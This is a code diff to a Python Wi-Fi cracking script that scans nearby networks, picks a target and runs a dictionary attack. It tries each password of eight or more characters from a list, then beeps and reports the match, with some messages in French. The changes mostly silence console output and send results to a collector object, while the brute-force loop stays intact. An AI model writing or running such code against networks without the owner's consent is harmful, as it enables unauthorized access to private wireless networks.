@@ -18,7 +18,7 @@ def scan():
     interface.scan()
     for i in range(52):
         sleep(.15)
-        stdout.write(f'\r Scanning... {next(loading_chars)}')
+        #stdout.write(f'\r Scanning... {next(loading_chars)}')
     result = interface.scan_results()
     return result
 
@@ -87,33 +87,33 @@ def startHack(selected, h):
                 selected_host = input('\n Please enter a valid host: ')
 
     target = hosts[selected_host]
-    tests = 1
-    print("Attaque du reseau "+target+"\n")
+    tests = 0
+    # print("Attaque du reseau "+target+"\n")
 
     with open(os.path.realpath(password_list)) as passlist:
         for password in passlist.readlines():
             if len(password) < 8:
                 continue
-
-            color = next(colors)
-            cprint(f' Test du mot de passe nº{tests}: {password}\n', color=color)
-            results+=f' Test du mot de passe nº{tests}: {password}\n'
             tests += 1
+            #color = next(colors)
+            # cprint(f' Test du mot de passe nº{tests}: {password}\n', color=color)
+            results+=f' Test du mot de passe nº{tests}: {password}\n'
+
 
             if testwifi(target, password):
                 Beep(700, 500)
                 Beep(1000, 500)
-                cprint(f' PASSWORD: {password}', color='green')
-                results+=f' PASSWORD: {password}'
-                print(f' {tests} Password tested!')
+                cprint(f' Mot de passe trouvé: {password}', color='green')
+                results+=f' Mot de passe trouvé : {password}'
+                # print(f' {tests} Password tested!')
                 results+=f' {tests} Password tested!\n'
                 break
 
             c.addResults(results)
             results = ""
     sleep(1)
-    input(' Press enter to exit...')
-    print(f' {tests} Password tested!')
+    # input(' Press enter to exit...')
+    # print(f' {tests} Password tested!')
     results += f' {tests} Password tested!\n'
     c.addResults(results)
     c.setIsOver(True)
